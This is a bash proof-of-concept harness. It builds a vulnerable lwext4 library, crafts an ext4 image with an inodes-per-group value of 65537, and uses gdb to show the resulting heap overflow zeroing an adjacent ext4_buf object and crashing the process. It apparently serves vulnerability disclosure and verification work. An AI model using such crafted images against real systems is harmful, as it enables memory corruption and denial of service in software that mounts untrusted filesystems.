#!/usr/bin/env bash
# Rung-4 adjacent-live-object check on the real lwext4 library (plain build).
# Crafts an ext4 image with image-derived s_inodes_per_group=65537, mounts it
# through the real ext4_fs_init()/ext4_fs_get_block_group_ref() path, and uses
# gdb to compare the real adjacent heap object (struct ext4_buf) before and
# after ext4_fs_init_inode_bitmap()'s memset. Also runs a plain process to
# show the resulting natural crash. No chosen pointer, no command execution.
set -u
cd "$(dirname "$0")"
pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
has() { grep -qF "$2" "$1"; }

cd real
cmake -S lwext4-upstream/vuln -B build-vuln-plain -DLIB_ONLY=1 \
    -DCMAKE_C_FLAGS='-g -O0' > evidence/build-vuln-plain.log 2>&1 \
    && cmake --build build-vuln-plain -j4 >> evidence/build-vuln-plain.log 2>&1 \
    && ok "plain vulnerable library build" || bad "plain vulnerable library build"
gcc -g -O0 -Ilwext4-upstream/vuln/include \
    -Ilwext4-upstream/vuln/blockdev/linux -Ibuild-vuln-plain/include \
    mount_driver.c lwext4-upstream/vuln/blockdev/linux/ext4_filedev.c \
    -Wl,--start-group build-vuln-plain/src/liblwext4.a \
    build-vuln-plain/blockdev/libblockdev.a -Wl,--end-group \
    -o driver-vuln-plain > evidence/compile-vuln-plain.log 2>&1 \
    && ok "plain victim driver build" || bad "plain victim driver build"

python3 craft_image.py image-base.ext4 image-victim.ext4 65537 \
    > evidence/craft-victim.out 2>&1 \
    && ok "image-derived ipg=65537" || bad "image-derived ipg=65537"

gdb -q -batch \
    -ex 'break ext4_fs.c:404' -ex run \
    -ex 'p b.buf->bc' \
    -ex 'p (long)((char*)b.buf-(char*)b.data)' \
    -ex 'x/8bx b.buf' \
    -ex 'advance 416' \
    -ex 'p b.buf->bc' \
    -ex 'x/8bx b.data+4096' \
    -ex 'x/8bx b.data+8192' \
    --args ./driver-vuln-plain victim image-victim.ext4 \
    > evidence/real-vuln-victim-gdb.out 2>&1

L=evidence/real-vuln-victim-gdb.out
has $L 'Breakpoint 1, ext4_fs_init_inode_bitmap' \
    && ok "stopped before image-derived memset" || bad "stopped before image-derived memset"
has $L '$1 = (struct ext4_bcache *) 0x' \
    && ok "adjacent ext4_buf.bc live before overflow" || bad "adjacent ext4_buf.bc live before overflow"
has $L '$2 = 4112' \
    && ok "adjacent ext4_buf at data+4112" || bad "adjacent ext4_buf at data+4112"
has $L '$3 = (struct ext4_bcache *) 0x0' \
    && ok "adjacent ext4_buf.bc zeroed after overflow" || bad "adjacent ext4_buf.bc zeroed after overflow"
has $L '0xfe' \
    && ok "image-chosen bit byte 0xfe at data+8192" || bad "image-chosen bit byte 0xfe at data+8192"

set +e
stdbuf -o0 ./driver-vuln-plain victim image-victim.ext4 \
    > evidence/real-vuln-victim-plain.out 2>&1
rc=$?
set -e
[ "$rc" -eq 139 ] \
    && ok "plain process crashes in corrupted live object (rc=139)" \
    || bad "plain process crashes in corrupted live object (rc=139)"

echo "VICTIM_PASS=$pass VICTIM_FAIL=$fail"
[ "$fail" -eq 0 ] && echo 'ADJACENT OBJECT REPLAY PASS' || echo 'ADJACENT OBJECT REPLAY FAIL'
exit "$fail"
